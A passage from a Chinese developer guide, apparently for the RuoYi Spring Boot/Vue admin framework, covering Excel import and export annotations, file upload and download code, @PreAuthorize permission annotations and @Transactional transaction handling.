	  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-link</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">font-size</span><span class="token punctuation">:</span>12px</span><span class="token punctuation">"</span></span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>importTemplate<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>下载模板<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-link</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-upload__tip<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span></span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tip<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>提示：仅允许导入“xls”或“xlsx”格式文件！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-upload</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dialog-footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>primary<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submitFileForm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>确 定<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.open = false<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>取 消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-dialog</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>4、在实体变量上添加@Excel注解，默认为导出导入，也可以单独设置仅导入Type.IMPORT</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户序号"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">Long</span> id<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"部门编号"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token class-name">Type</span><span class="token punctuation">.</span>IMPORT<span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">Long</span> deptId<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户名称"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>

<span class="token comment">/** 导出部门多个对象 */</span>
<span class="token annotation punctuation">@Excels</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
	<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"部门名称"</span><span class="token punctuation">,</span> targetAttr <span class="token operator">=</span> <span class="token string">"deptName"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token class-name">Type</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"部门负责人"</span><span class="token punctuation">,</span> targetAttr <span class="token operator">=</span> <span class="token string">"leader"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token class-name">Type</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">SysDept</span> dept<span class="token punctuation">;</span>

<span class="token comment">/** 导出部门单个对象 */</span>
<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"部门名称"</span><span class="token punctuation">,</span> targetAttr <span class="token operator">=</span> <span class="token string">"deptName"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token class-name">Type</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">SysDept</span> dept<span class="token punctuation">;</span>
</code></pre>
<p>5、在Controller添加导入方法，updateSupport属性为是否存在则覆盖（可选）</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"用户管理"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>IMPORT<span class="token punctuation">)</span>
<span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/importData"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">importData</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span> <span class="token keyword">boolean</span> updateSupport<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysUser</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> userList <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">LoginUser</span> loginUser <span class="token operator">=</span> tokenService<span class="token punctuation">.</span><span class="token function">getLoginUser</span><span class="token punctuation">(</span><span class="token class-name">ServletUtils</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">String</span> operName <span class="token operator">=</span> loginUser<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">String</span> message <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">importUser</span><span class="token punctuation">(</span>userList<span class="token punctuation">,</span> updateSupport<span class="token punctuation">,</span> operName<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/importTemplate"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">importTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysUser</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> util<span class="token punctuation">.</span><span class="token function">importTemplateExcel</span><span class="token punctuation">(</span><span class="token string">"用户数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>小提示：</p>
<pre><code class="prism language-tex">也可以直接到main运行此方法测试。
</code></pre>
<pre><code class="prism language-java"><span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"D:\\test.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Entity</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Entity</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">Entity</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Entity</span><span class="token punctuation">&gt;</span></span> userList <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="4_1726"></a>.4、自定义标题信息</h3>
<p>有时候我们希望导出表格包含标题信息，我们可以这样做。</p>
<p><strong>导出用户管理表格新增标题（用户列表）</strong></p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysUser</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> util<span class="token punctuation">.</span><span class="token function">exportExcel</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"用户数据"</span><span class="token punctuation">,</span> <span class="token string">"用户列表"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>导入表格包含标题处理方式，其中<code>1</code>表示标题占用行数，根据实际情况填写。</strong></p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">importData</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span> <span class="token keyword">boolean</span> updateSupport<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysUser</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> userList <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">String</span> operName <span class="token operator">=</span> <span class="token class-name">SecurityUtils</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">String</span> message <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">importUser</span><span class="token punctuation">(</span>userList<span class="token punctuation">,</span> updateSupport<span class="token punctuation">,</span> operName<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="5_1756"></a>.5、自定义数据处理器</h3>
<p>有时候我们希望数据展现为一个特殊的格式，或者需要对数据进行其它处理。<code>Excel</code>注解提供了自定义数据处理器以满足各种业务场景。而实现一个数据处理器也是非常简单的。如下：</p>
<p>1、在实体类用<code>Excel</code>注解<code>handler</code>属性指定自定义的数据处理器</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">extends</span> <span class="token class-name">BaseEntity</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户名称"</span><span class="token punctuation">,</span> handler <span class="token operator">=</span> <span class="token class-name">MyDataHandler</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token string">"bbb"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、编写数据处理器<code>MyDataHandler</code>继承<code>ExcelHandlerAdapter</code>，返回值为处理后的值。</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyDataHandler</span> <span class="token keyword">implements</span> <span class="token class-name">ExcelHandlerAdapter</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// value 为单元格数据值</span>
		<span class="token comment">// args 为excel注解args参数组</span>
		<span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="_1787"></a>八、上传下载</h2>
<p>首先创建一张上传文件的表，例如：</p>
<pre><code class="prism language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_file_info<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_file_info <span class="token punctuation">(</span>
  file_id           <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>          <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span>       <span class="token keyword">comment</span> <span class="token string">'文件id'</span><span class="token punctuation">,</span>
  file_name         <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>      <span class="token keyword">default</span> <span class="token string">''</span>                    <span class="token keyword">comment</span> <span class="token string">'文件名称'</span><span class="token punctuation">,</span>
  file_path         <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>                    <span class="token keyword">comment</span> <span class="token string">'文件路径'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>file_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">default</span> <span class="token keyword">charset</span><span class="token operator">=</span>utf8 <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'文件信息表'</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="1_1803"></a>.1、上传实现流程</h3>
<p>1、<code>el-input</code>修改成<code>el-upload</code></p>
<pre><code class="prism language-vue">&lt;el-upload
  ref="upload"
  :limit="1"
  accept=".jpg, .png"
  :action="upload.url"
  :headers="upload.headers"
  :file-list="upload.fileList"
  :on-progress="handleFileUploadProgress"
  :on-success="handleFileSuccess"
  :auto-upload="false"&gt;
  &lt;el-button slot="trigger" size="small" type="primary"&gt;选取文件&lt;/el-button&gt;
  &lt;el-button style="margin-left: 10px;" size="small" type="success" :loading="upload.isUploading" @click="submitUpload"&gt;上传到服务器&lt;/el-button&gt;
  &lt;div slot="tip" class="el-upload__tip"&gt;只能上传jpg/png文件，且不超过500kb&lt;/div&gt;
&lt;/el-upload&gt;
</code></pre>
<p>2、引入获取<code>token</code></p>
<pre><code class="prism language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getToken <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/utils/auth"</span><span class="token punctuation">;</span>
</code></pre>
<p>3、<code>data</code>中添加属性</p>
<pre><code class="prism language-javascript"><span class="token comment">// 上传参数</span>
upload<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 是否禁用上传</span>
  isUploading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token comment">// 设置上传的请求头部</span>
  headers<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> Authorization<span class="token operator">:</span> <span class="token string">"Bearer "</span> <span class="token operator">+</span> <span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">// 上传的地址</span>
  url<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_BASE_API</span> <span class="token operator">+</span> <span class="token string">"/common/upload"</span><span class="token punctuation">,</span>
  <span class="token comment">// 上传的文件列表</span>
  fileList<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre>
<p>4、新增和修改操作对应处理<code>fileList</code>参数</p>
<pre><code class="prism language-javascript"><span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token operator">...</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">handleUpdate</span><span class="token punctuation">(</span><span class="token parameter">row</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token operator">...</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span> name<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>fileName<span class="token punctuation">,</span> url<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>filePath <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>5、添加对应事件</p>
<pre><code class="prism language-javascript"><span class="token comment">// 文件提交处理</span>
<span class="token function">submitUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">// 文件上传中处理</span>
<span class="token function">handleFileUploadProgress</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span> file<span class="token punctuation">,</span> fileList</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>isUploading <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">// 文件上传成功处理</span>
<span class="token function">handleFileSuccess</span><span class="token punctuation">(</span><span class="token parameter">response<span class="token punctuation">,</span> file<span class="token punctuation">,</span> fileList</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>isUploading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>filePath <span class="token operator">=</span> response<span class="token punctuation">.</span>url<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">msgSuccess</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="2_1889"></a>.2、下载实现流程</h3>
<p>1、添加对应按钮和事件</p>
<pre><code class="prism language-vue">&lt;el-button
  size="mini"
  type="text"
  icon="el-icon-edit"
  @click="handleDownload(scope.row)"
&gt;下载&lt;/el-button&gt;
</code></pre>
<p>2、实现文件下载</p>
<pre><code class="prism language-javascript"><span class="token comment">// 文件下载处理</span>
<span class="token function">handleDownload</span><span class="token punctuation">(</span><span class="token parameter">row</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">var</span> name <span class="token operator">=</span> row<span class="token punctuation">.</span>fileName<span class="token punctuation">;</span>
  <span class="token keyword">var</span> url <span class="token operator">=</span> row<span class="token punctuation">.</span>filePath<span class="token punctuation">;</span>
  <span class="token keyword">var</span> suffix <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'download'</span><span class="token punctuation">,</span> name <span class="token operator">+</span> suffix<span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> <span class="token string">'_blank'</span><span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="_1920"></a>九、权限注解</h2>
<ol><li>数据权限示例。</li></ol>
<pre><code class="prism language-java"><span class="token comment">// 符合system:user:list权限要求</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:user:list')"</span><span class="token punctuation">)</span>

<span class="token comment">// 不符合system:user:list权限要求</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.lacksPermi('system:user:list')"</span><span class="token punctuation">)</span>

<span class="token comment">// 符合system:user:add或system:user:edit权限要求即可</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasAnyPermi('system:user:add,system:user:edit')"</span><span class="token punctuation">)</span>
</code></pre>
<ol><li>角色权限示例。</li></ol>
<pre><code class="prism language-java"><span class="token comment">// 属于user角色</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasRole('user')"</span><span class="token punctuation">)</span>

<span class="token comment">// 不属于user角色</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.lacksRole('user')"</span><span class="token punctuation">)</span>

<span class="token comment">// 属于user或者admin之一</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasAnyRoles('user,admin')"</span><span class="token punctuation">)</span>
</code></pre>
<h2><a id="_1948"></a>十、事务管理</h2>
<p>新建的<code>Spring Boot</code>项目中，一般都会引用<code>spring-boot-starter</code>或者<code>spring-boot-starter-web</code>，而这两个起步依赖中都已经包含了对于<code>spring-boot-starter-jdbc</code>或<code>spring-boot-starter-data-jpa</code>的依赖。 当我们使用了这两个依赖的时候，框架会自动默认分别注入<code>DataSourceTransactionManager</code>或<code>JpaTransactionManager</code>。 所以我们不需要任何额外配置就可以用<code>@Transactional</code>注解进行事务的使用。</p>
<p>提示</p>
<p>@Transactional注解只能应用到public可见度的方法上，可以被应用于接口定义和接口方法，方法会覆盖类上面声明的事务。</p>
<p>例如用户新增需要插入用户表、用户与岗位关联表、用户与角色关联表，如果插入成功，那么一起成功，如果中间有一条出现异常，那么回滚之前的所有操作， 这样可以防止出现脏数据，就可以使用事务让它实现回退。<br/> 做法非常简单，我们只需要在方法或类添加<code>@Transactional</code>注解即可。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 新增用户信息</span>
	<span class="token keyword">int</span> rows <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户岗位关联</span>
	<span class="token function">insertUserPost</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户与角色管理</span>
	<span class="token function">insertUserRole</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> rows<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>常见坑点1：遇到检查异常时，事务开启，也无法回滚。 例如下面这段代码，用户依旧增加成功，并没有因为后面遇到检查异常而回滚！！</li></ul>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 新增用户信息</span>
